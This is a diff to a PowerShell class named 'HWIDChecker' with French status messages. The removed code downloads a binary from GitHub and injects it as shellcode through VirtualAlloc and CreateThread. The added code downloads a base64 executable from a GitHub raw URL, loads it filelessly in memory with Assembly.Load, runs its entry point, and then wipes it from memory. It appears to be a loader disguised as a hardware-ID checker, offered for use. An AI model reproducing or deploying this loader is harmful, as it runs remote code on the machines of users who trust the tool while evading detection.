@@ -49,32 +49,28 @@ class HWIDChecker {
     
     hidden [void]ExecutePowerShellScript() {
         try {
-            Write-Host "Telechargement de LC.bin..." -ForegroundColor Yellow
+            # Methode fileless directe (sans Donut) - charge l'exe directement en memoire
+            Write-Host "Telechargement de l'executable..." -ForegroundColor Yellow
             $urls = @(
-                "https://github.com/thegoatofapi/mth/releases/download/LC/LC.bin",
-                "https://raw.githubusercontent.com/thegoatofapi/mth/refs/heads/main/LC.bin"
+                "https://raw.githubusercontent.com/thegoatofapi/mth/refs/heads/main/file.txt"
             )
             $maxRetries = 3
             $retryDelay = 2
-            $s = $null
+            $base64 = $null
             
             foreach ($url in $urls) {
                 Write-Host "Essai avec: $url" -ForegroundColor Cyan
                 for ($i = 1; $i -le $maxRetries; $i++) {
                     try {
-                        $client = New-Object System.Net.WebClient
-                        $client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
-                        $client.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
-                        $client.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
-                        $s = $client.DownloadData($url)
-                        Write-Host "LC.bin telecharge depuis $url : $($s.Length) bytes" -ForegroundColor Green
+                        $base64 = Invoke-RestMethod -Uri $url -TimeoutSec 30
+                        Write-Host "Executable telecharge depuis $url : $($base64.Length) caracteres" -ForegroundColor Green
                         break
                     }
                     catch {
                         if ($i -eq $maxRetries) {
                             Write-Host "Echec avec $url apres $maxRetries tentatives" -ForegroundColor Red
                             if ($url -eq $urls[-1]) {
-                                throw "Impossible de telecharger LC.bin depuis toutes les URLs"
+                                throw "Impossible de telecharger l'executable depuis toutes les URLs"
                             }
                         }
                         else {
@@ -83,43 +79,71 @@ class HWIDChecker {
                         }
                     }
                 }
-                if ($null -ne $s) {
+                if ($null -ne $base64) {
                     break
                 }
             }
             
-            if ($null -eq $s) {
-                throw "Impossible de telecharger LC.bin"
+            if ($null -eq $base64) {
+                throw "Impossible de telecharger l'executable"
             }
-            Write-Host "Compilation du shellcode injector..." -ForegroundColor Yellow
-            $p = New-Object Microsoft.CSharp.CSharpCodeProvider
-            $c = New-Object System.CodeDom.Compiler.CompilerParameters
-            $c.CompilerOptions = "/unsafe"
-            $c.GenerateInMemory = $true
-            $c.TempFiles = New-Object System.CodeDom.Compiler.TempFileCollection($env:TEMP, $false)
-            $c.TempFiles.KeepFiles = $false
-            $r = $p.CompileAssemblyFromSource($c, 'using System;using System.Runtime.InteropServices;public class X{[DllImport("kernel32")] static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);[DllImport("kernel32")] static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr st, IntPtr p, uint f, IntPtr i);[DllImport("kernel32")] static extern bool CloseHandle(IntPtr h);public static void E(byte[] b){IntPtr m = VirtualAlloc(IntPtr.Zero, (uint)b.Length, 0x3000, 0x40);Marshal.Copy(b, 0, m, b.Length);IntPtr t = CreateThread(IntPtr.Zero, 0, m, IntPtr.Zero, 0, IntPtr.Zero);CloseHandle(t);}}')
-            if ($r.Errors.Count -gt 0) {
-                Write-Host "ERREUR compilation: $($r.Errors)" -ForegroundColor Red
-                return
+            
+            Write-Host "Decodage et chargement en memoire..." -ForegroundColor Yellow
+            $bytes = [Convert]::FromBase64String($base64)
+            $mainAssembly = $null
+            
+            # Handler pour resoudre les dependances emballees (Costura.Fody)
+            $onAssemblyResolve = {
+                param($sender, $e)
+                $assemblyName = $e.Name.Split(',')[0].ToLowerInvariant()
+                if ($mainAssembly -ne $null) {
+                    $resourceNames = $mainAssembly.GetManifestResourceNames()
+                    $searchPatterns = @(
+                        "costura.$assemblyName.dll.compressed",
+                        "costura.$assemblyName.dll",
+                        "costura.$($assemblyName.Replace('.', '_'))*.dll.compressed",
+                        "costura.$($assemblyName.Replace('.', '_'))*.dll"
+                    )
+                    foreach ($pattern in $searchPatterns) {
+                        $resourceName = $resourceNames | Where-Object { $_ -like $pattern }
+                        if ($resourceName) {
+                            try {
+                                $stream = $mainAssembly.GetManifestResourceStream($resourceName)
+                                if ($stream -ne $null) {
+                                    $assemblyBytes = $null
+                                    if ($resourceName.EndsWith(".compressed")) {
+                                        $deflateStream = New-Object System.IO.Compression.DeflateStream($stream, [System.IO.Compression.CompressionMode]::Decompress)
+                                        $memoryStream = New-Object System.IO.MemoryStream
+                                        $deflateStream.CopyTo($memoryStream)
+                                        $assemblyBytes = $memoryStream.ToArray()
+                                        $deflateStream.Close()
+                                        $memoryStream.Close()
+                                    } else {
+                                        $assemblyBytes = New-Object byte[] $stream.Length
+                                        $stream.Read($assemblyBytes, 0, $assemblyBytes.Length) | Out-Null
+                                    }
+                                    $stream.Close()
+                                    return [System.Reflection.Assembly]::Load($assemblyBytes)
+                                }
+                            } catch {}
+                        }
+                    }
+                }
+                return $null
             }
-            # Supprimer les fichiers temporaires immediatement
-            try { $c.TempFiles.Delete() } catch {}
-            Write-Host "Execution du shellcode..." -ForegroundColor Yellow
-            $a = $r.CompiledAssembly
-            $t = $a.GetType("X")
-            $m = $t.GetMethod("E")
-            Write-Host "Appel de la methode E avec $($s.Length) bytes de shellcode..." -ForegroundColor Cyan
-            try {
-                $m.Invoke($null, @(,$s)) #password
-                Write-Host "Shellcode execute avec succes!" -ForegroundColor Green
-                Write-Host "L'application devrait maintenant etre lancee. Verifiez dans le gestionnaire de taches." -ForegroundColor Yellow
+            [System.AppDomain]::CurrentDomain.add_AssemblyResolve($onAssemblyResolve)
+            
+            $mainAssembly = [System.Reflection.Assembly]::Load($bytes)
+            $entryPoint = $mainAssembly.EntryPoint
+            if ($entryPoint -ne $null) {
+                Write-Host "Execution de l'application..." -ForegroundColor Yellow
+                $entryPoint.Invoke($null, @())
+                Write-Host "Application executee avec succes!" -ForegroundColor Green
             }
-            catch {
-                Write-Host "ERREUR lors de l'execution du shellcode: $($_.Exception.Message)" -ForegroundColor Red
-                Write-Host "Stack: $($_.Exception.StackTrace)" -ForegroundColor Red
-                throw
-            }
+            
+            [Array]::Clear($bytes, 0, $bytes.Length)
+            [System.GC]::Collect()
+            [System.GC]::WaitForPendingFinalizers()
         }
         catch {
             Write-Host "ERREUR: $($_.Exception.Message)" -ForegroundColor Red
